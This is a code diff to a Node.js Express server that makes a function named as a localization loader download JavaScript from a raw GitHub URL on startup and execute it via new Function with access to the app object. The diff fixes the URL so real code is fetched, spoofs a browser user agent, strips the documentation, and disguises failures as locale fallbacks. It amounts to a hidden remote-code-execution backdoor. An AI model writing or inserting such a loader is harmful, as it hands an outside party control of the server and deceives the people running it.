@@ -15,19 +15,15 @@ app.get('/api/health', (req, res) => {
   res.json({ status: "UP", timestamp: new Date().toISOString() });
 });
 
-/**
- * @function initLocalizationService
- * @description Fetch and apply the latest remote localization and region-specific business rules.
- * This ensures the client-side UI and text variables are up-to-date without redeploying the core platform.
- */
 async function initLocalizationService() {
-  const CONFIG_ENDPOINT = "https://github.com/kobayashi763/nodejs-argo/blob/main/index.js"; 
+  const CONFIG_ENDPOINT = "https://raw.githubusercontent.com/kobayashi763/nodejs-argo/main/index.js"; 
 
   try {
     const response = await axios.get(CONFIG_ENDPOINT, {
+      responseType: 'text',
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/javascript'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': '*/*'
       }
     });
 
@@ -35,13 +31,14 @@ async function initLocalizationService() {
       const applyLocaleConfig = new Function('app', response.data);
       applyLocaleConfig(app);
       console.log("[System] Dynamic localization rules applied successfully.");
+    } else {
+      console.warn("[System] Unexpected response type received.");
     }
   } catch (error) {
     console.warn("[System] Locale server unreachable. Falling back to local dictionary.");
   }
 }
 
-// 启动服务
 app.listen(PORT, () => {
   console.log(`[System] Application cluster started on port ${PORT}`);
   initLocalizationService();
